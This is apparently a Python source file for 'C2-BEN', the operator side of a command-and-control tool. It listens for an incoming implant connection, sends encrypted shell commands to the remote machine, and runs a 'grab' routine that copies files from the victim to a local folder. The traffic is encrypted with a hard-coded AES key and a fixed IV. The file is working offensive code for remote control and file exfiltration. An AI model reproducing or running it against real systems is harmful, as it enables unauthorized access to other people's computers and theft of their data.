import socket
import os, cgi
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

key = b"zj20~IlF+dhg33.+,ZHqGL)f\oH4F$b&"
IV = b"MqvxhvaY2&Hhw!H@"


def encrypt(message):
    try:
        encryptor = AES.new(key, AES.MODE_CBC, IV)
        padded_message = Padding.pad(message, 16)
        encrypted_message = encryptor.encrypt(padded_message)
        return encrypted_message
    except:
        return b""


def decrypt(cipher):
    try:
        decryptor = AES.new(key, AES.MODE_CBC, IV)
        decrypted_padded_message = decryptor.decrypt(cipher)
        decrypted_message = Padding.unpad(decrypted_padded_message, 16)
        return decrypted_message
    except:
        return b""

def transfer(conn, command):
    conn.send(encrypt(command.encode()))
    grab, path = command.split(" ")
    f = open('C:/Users/benza/Desktop/c2ben/' + path, 'wb')
    print("Creating local file: C:/Users/benza/Desktop/c2ben/" + path)
    while True:
        bits = decrypt(conn.recv(1024))
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print('[-] Unable to find out the file')
            break
        f.write(bits)


def connect(lisip, lisport):
    g_mydir = "shell"
    s = socket.socket()
    s.bind((lisip, int(lisport)))
    s.listen(1)
    print("Listening on " + str(lisip) + ":" + str(lisport))
    conn, address = s.accept()
    print('[+] We got a connection from: ' + str(address))
    while True:
        try:
            command = input(g_mydir + ">")
            if 'terminate' in command:
                conn.send(encrypt(b'terminate'))
                conn.close()
                break
            elif 'grab' in command:
                transfer(conn, command)
            elif command == "":
                continue
            else:
                command = encrypt(command.encode())
                conn.send(command)
                out = decrypt(conn.recv(1024)).decode()
                if 'ChangeDir' in out:
                    pre, g_mydir = out.split(' ')
                    continue
                print(out)
        except:
            print("Error")
            out = decrypt(conn.recv(1024)).decode()
            print(out)

def main():
    print("<C2-BEN initialized>\n")
    lisip = input("Enter you IP address (hit enter to listen on all interfaces): ")
    if str(lisip) == "":
        lisip = "0.0.0.0"
    lisport = int(input("Listen port: "))
    if str(lisport) == "":
        lisport = 443
    connect(lisip, lisport)


main()
